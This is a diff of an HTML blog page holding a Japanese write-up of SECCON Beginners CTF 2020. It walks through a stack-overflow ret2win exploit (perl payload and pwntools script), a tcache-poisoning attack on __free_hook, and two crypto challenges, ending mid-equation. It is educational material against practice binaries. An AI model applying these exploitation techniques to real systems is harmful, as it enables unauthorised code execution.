@@ -1,88 +1,123 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECCON Beginners CTF 2020 Write-up &middot; urandom</title>
-
-    <meta name="description" content="">
-
-    <meta name="generator" content="Hugo 0.68.3" />
-    <meta name="twitter:card" content="summary">
     
-    <meta name="twitter:title" content="SECCON Beginners CTF 2020 Write-up &middot; urandom">
-    <meta name="twitter:description" content="">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.92.1" />
 
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="SECCON Beginners CTF 2020 Write-up &middot; urandom">
-    <meta property="og:description" content="">
 
-    <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Oxygen:400,700' rel='stylesheet' type='text/css'>
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
 
-    <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/syntax.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/custom.css'>
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
+<title>SECCON Beginners CTF 2020 Write-up - urandom</title>
+
+
+<meta name="author" content="mayth" />
+
+
+<meta name="description" content="CTF team made up of graduates from University of Tsukuba, Japan" />
+
+
+<meta name="keywords" content="CTF, Write-ups, SECCON" />
+
+
+<meta property="og:title" content="SECCON Beginners CTF 2020 Write-up" />
+<meta name="twitter:title" content="SECCON Beginners CTF 2020 Write-up" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://urandom.team/post/seccon-beginners-ctf-2020/" /><meta property="og:description" content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー" />
+<meta name="twitter:description" content="2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー" /><meta property="og:image" content="https://urandom.team/images/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://urandom.team/images/og.png" /><meta property="article:published_time" content="2020-05-24T23:27:00+09:00" /><meta property="article:modified_time" content="2020-05-24T23:27:00+09:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+
+<link rel="stylesheet" href="https://urandom.team/assets/css/fuji.min.css" />
+
+
+
+
+
+
+
+
 </head>
-<body>
 
+<body
+  data-theme="auto"
+  data-theme-auto='true'
+  >
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <hgroup>
-            <h1 class="brand-title"><a href="//blog.urandom.team">urandom</a></h1>
-            <h2 class="brand-tagline"></h2>
-        </hgroup>
-
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href='//blog.urandom.team/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
-    </div>
-</div>
-
-
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://urandom.team">urandom</a>
             
-            <div class="posts">
-                <h1 class="content-subhead">24 May 2020, 23:27</h1>
-                <section class="post">
-                    <header class="post-header">
+        </div>
+    </div>
+</header>
 
-                        <a href="//blog.urandom.team/post/seccon-beginners-ctf-2020/" class="post-title">SECCON Beginners CTF 2020 Write-up</a>
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/seccon-beginners-ctf-2020/">SECCON Beginners CTF 2020 Write-up</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-24</span>
 
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">mayth</strong>
-                            
-                            
-                                under 
-                                
-                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
-                                
-                            
-                        </p>
-                    </header>
-                    
-                    <div class="post-description">
-                        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/ctf">CTF</a>&nbsp;<a href="/tags/write-ups">Write-ups</a>&nbsp;<a href="/tags/seccon">SECCON</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
 <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-<p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html">SECCON Beginners CTF 2020</a>のwrite-upです。</p>
+<p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html" target="_blank">SECCON Beginners CTF 2020</a>のwrite-upです。</p>
 <p>なお、今回は以下のメンバー編成で参加しました。</p>
 <ul>
 <li>yuscarlet</li>
@@ -122,51 +157,41 @@
                    +--------------------+
 0x00007ffeb1443b08 | 0x00007ffeb1443be8 |
                    +--------------------+
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の<code>win</code>関数では、<code>system(&quot;/bin/sh&quot;)</code>を呼び出してくれる。つまり<code>win</code>関数を呼べれば自動的にシェルが取れる。</p>
 <p>さて、IDAで実行ファイルを見てみると、<code>vuln</code>という関数で入力を受け付けて<code>buf</code>に格納していることがわかる。このとき、<code>buf</code>は<code>0x20</code>(32)byteしかない一方で、<code>read</code>関数を呼ぶときに入力サイズを<code>0x200</code>に設定していて、ここでスタックオーバーフローが発生する。これを使って&quot;return address (vuln)&ldquo;となっている箇所を書き換えればよい。飛び先となる<code>win</code>関数のアドレスは分かっているし、&ldquo;return address&quot;までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。</p>
 <pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x61\x08\x40&quot;' | ./chall
-</code></pre><p>これは失敗する。</p>
+</code></pre>
+<p>これは失敗する。</p>
 <blockquote>
 <pre><code>Oops! RSP is misaligned!
 Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
 This instruction fails when RSP is not a multiple of 0x10.
 Find a way to align RSP! You're almost there!
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>というわけで、<code>rsp</code>（スタックポインタ）が<code>0x10</code>の倍数になっていないといけない。スタックポインタは8byteずつ動くので、<code>push</code>/<code>pop</code>が呼び出される回数を1回増やすか減らすかする。</p>
 <p><code>win</code>関数があるという<code>0x400861</code>だが、これは関数の先頭、すなわち<code>push rbp</code>を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。<code>push rbp</code>の直後の<code>0x400862</code>を書き込むようにする。</p>
 <pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x62\x08\x40&quot;' | ./chall
 ...
 Congratulations!
-</code></pre><p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
+</code></pre>
+<p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
 <p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre><code class="language-python">from pwn import *
 
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+context.arch = 'amd64'
 
-<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;chall&#39;</span><span class="p">)</span>
+io = process('chall')
 
-<span class="n">vuln_ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x400862</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">vuln_ret</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
+vuln_ret = pack(0x400862)
+io.sendline(b'A' * 40 + vuln_ret)
+io.interactive()
+</code></pre>
+<p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
 <h3 id="beginners-heap">Beginner&rsquo;s Heap</h3>
-<p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
+<p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207" target="_blank">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
 <p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p>
 <blockquote>
 <pre><code>Let's learn heap overflow today
@@ -188,7 +213,8 @@ Call &lt;win&gt; function and you'll get the flag.
 4. Describe heap
 5. Describe tcache (for size 0x20)
 6. Currently available hint
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>この対話環境を操作し、ヒープオーバーフローを使って<code>win</code>関数を呼び出すのが目標となる。なお、<code>__free_hook</code>と<code>win</code>関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では<code>__free_hook</code>だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。</p>
 <p><code>A</code>は<code>0x18</code>byteしかない一方で、1の操作で<code>0x80</code>byteまで書くことができる。<code>B</code>にはオーバーフローの脆弱性はないが、2の操作で<code>malloc</code>して書き込み、3の操作で<code>free</code>ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。</p>
 <p>何はともあれヒントを見てみる。</p>
@@ -197,7 +223,8 @@ Call &lt;win&gt; function and you'll get the flag.
 Every list can keep up to 7 chunks.
 A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
 Let's check what happens when you overwrite fd by Heap Overflow.
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>まず2でBを<code>malloc</code>して適当な値を書き込み、3で<code>free</code>する。この時点で4/5を実行すると次のような状態であることがわかる。</p>
 <blockquote>
 <pre><code>-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
@@ -225,7 +252,8 @@ Let's check what happens when you overwrite fd by Heap Overflow.
 0x0000558bbf3eb368 | 0x0000000000020ca1 |
                    +--------------------+
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <blockquote>
 <pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
 [    tcache (for 0x20)    ]
@@ -236,22 +264,18 @@ Let's check what happens when you overwrite fd by Heap Overflow.
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
 この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
+<pre><code class="language-python">p.sendline(b'X' * 0x20 + p64(free_hook_addr))
+</code></pre>
+<p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 But the chunk size is broken or too big maybe...?
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <blockquote>
 <pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
 [    tcache (for 0x20)    ]
@@ -265,51 +289,42 @@ But the chunk size is broken or too big maybe...?
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<pre><code class="language-python">p.sendlineafter(&quot;&gt; &quot;, '1')
+p.sendline(b'X' * 0x18 + p64(0x20) + p64(free_hook_addr))
+</code></pre>
+<blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 But you can't get __free_hook since you can only malloc/free B.
 What if you change the chunk size to a value other than 0x20...?
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>あまりに大きすぎると先ほどのように壊れていると言われるので、<code>0x30</code>にすると次の段階になった。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 And the chunk size is properly forged!
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>この段階でのヒントはこんな感じ。</p>
+<pre><code class="language-python">p.sendlineafter(&quot;&gt; &quot;, '2')
+p.sendline(b'X' * 0x10)
+</code></pre>
+<p>この段階でのヒントはこんな感じ。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 The first link of tcache is __free_hook!
 But B is not empty...
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p><code>B</code>を<code>free</code>して空にしてみる。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 The first link of tcache is __free_hook!
 Also B is empty! You know what to do, right?
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>ここでtcacheの状態を見てみると、<code>B</code>を<code>free</code>したのにここに追加されておらず、<code>__free_hook</code>のアドレスだけが残っていることがわかる。</p>
 <blockquote>
 <pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
@@ -321,95 +336,57 @@ Also B is empty! You know what to do, right?
         \/
 [      END OF TCACHE      ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>最初のヒントには以下の記載があった。</p>
 <blockquote>
 <pre><code>Tcache manages freed chunks in linked lists by size.
-</code></pre></blockquote>
+</code></pre>
+</blockquote>
 <p>また、冒頭に挙げた記事にも次の記載がある。</p>
 <blockquote>
 <p>定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, &hellip;, 0x408バイト以下というように区切られています。</p>
 </blockquote>
 <p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p>
 <p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">win_addr</span><span class="p">))</span>
+<pre><code class="language-python">p.sendlineafter('&gt; ', '2')
+p.sendline(pack(win_addr))
 
-<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+p.sendlineafter('&gt; ', '3')
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s2">&#34;ctf4b&#34;</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="crypto">Crypto</h2>
+log.info(p.recvline_contains(&quot;ctf4b&quot;))
+</code></pre>
+<h2 id="crypto">Crypto</h2>
 <h3 id="rb">R&amp;B</h3>
 <p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p>
 <h3 id="noisy-equations">Noisy equations</h3>
 <p>下記のPythonプログラムが動いている。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
-<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">getrandbits</span><span class="p">,</span> <span class="n">seed</span>
+<pre><code class="language-python">from os import getenv
+from time import time
+from random import getrandbits, seed
 
 
-<span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-<span class="n">SEED</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;SEED&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+FLAG = getenv(&quot;FLAG&quot;).encode()
+SEED = getenv(&quot;SEED&quot;).encode()
 
-<span class="n">L</span> <span class="o">=</span> <span class="mi">256</span>
-<span class="n">N</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+L = 256
+N = len(FLAG)
 
 
-<span class="k">def</span> <span class="nf">dot</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">):</span>
-    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
-    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">)])</span>
+def dot(A, B):
+    assert len(A) == len(B)
+    return sum([a * b for a, b in zip(A, B)])
 
-<span class="n">coeffs</span> <span class="o">=</span> <span class="p">[[</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
+coeffs = [[getrandbits(L) for _ in range(N)] for _ in range(N)]
 
-<span class="n">seed</span><span class="p">(</span><span class="n">SEED</span><span class="p">)</span>
+seed(SEED)
 
-<span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">dot</span><span class="p">(</span><span class="n">coeff</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">)</span> <span class="o">+</span> <span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">coeff</span> <span class="ow">in</span> <span class="n">coeffs</span><span class="p">]</span>
+answers = [dot(coeff, FLAG) + getrandbits(L) for coeff in coeffs]
 
-<span class="k">print</span><span class="p">(</span><span class="n">coeffs</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">answers</span><span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
+print(coeffs)
+print(answers)
+</code></pre>
+<p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
 <code>answers</code>が表示されているが、これには乱数<code>getrandbits(L)</code>が加算されているので、
 2回分のデータを使っていくという方法がある。
 いま1回目の結果得られた<code>coeffs</code>を\(C_1\)、そして2回目を\(C_2\)とすると、
@@ -418,18 +395,18 @@ Also B is empty! You know what to do, right?
 \begin{align*}
 C_1 &amp;= \left[
 \begin{array}{cccc}
-c^1_{1,1} &amp; c^1_{1,2} &amp; \dots &amp; c^1_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^1_{1,1} &amp; c^1_{1,2} &amp; \dots &amp; c^1_{1,44} \\\
+\vdots &amp; \ddots &amp;  &amp; \vdots \\\
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
 c^1_{44,1} &amp; c^1_{44,2} &amp; \dots &amp; c^1{44,44}
 \end{array}
-\right] \\<br>
-\\<br>
+\right] \\\
+\\\
 C_2 &amp;= \left[
 \begin{array}{cccc}
-c^2_{1,1} &amp; c^2_{1,2} &amp; \dots &amp; c^2_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^2_{1,1} &amp; c^2_{1,2} &amp; \dots &amp; c^2_{1,44} \\\
+\vdots &amp; \ddots &amp;  &amp; \vdots \\\
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
 c^2_{44,1} &amp; c^2_{44,2} &amp; \dots &amp; c^2_{44,44}
 \end{array}
 \right]
@@ -440,16 +417,16 @@ $$</p>
 \begin{align*}
 A_1 &amp;= \left[
 \begin{array}{c}
-a^1_{1} \\<br>
-\vdots \\<br>
+a^1_{1} \\\
+\vdots \\\
 a^1_{44}
 \end{array}
-\right] \\<br>
-\\<br>
+\right] \\\
+\\\
 A_2 &amp;= \left[
 \begin{array}{c}
-a^2_{1} \\<br>
-\vdots \\<br>
+a^2_{1} \\\
+\vdots \\\
 a^2_{44}
 \end{array}
 \right]
@@ -470,310 +447,166 @@ $$</p>
 <p>$$
 \left[
 \begin{array}{c}
-a^1_{1} - a^2_{1} \\<br>
-\vdots \\<br>
+a^1_{1} - a^2_{1} \\\
+\vdots \\\
 a^1_{44} - a^2_{44}
 \end{array}
 \right] = \left[
 \begin{array}{cccc}
-c^1_{1,1} - c^2_{1,1} &amp; c^1_{1,2} - c^2_{1,2} &amp; \dots &amp; c^1_{1,44} - c^2_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^1_{1,1} - c^2_{1,1} &amp; c^1_{1,2} - c^2_{1,2} &amp; \dots &amp; c^1_{1,44} - c^2_{1,44} \\\
+\vdots &amp; \ddots &amp;  &amp; \vdots \\\
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
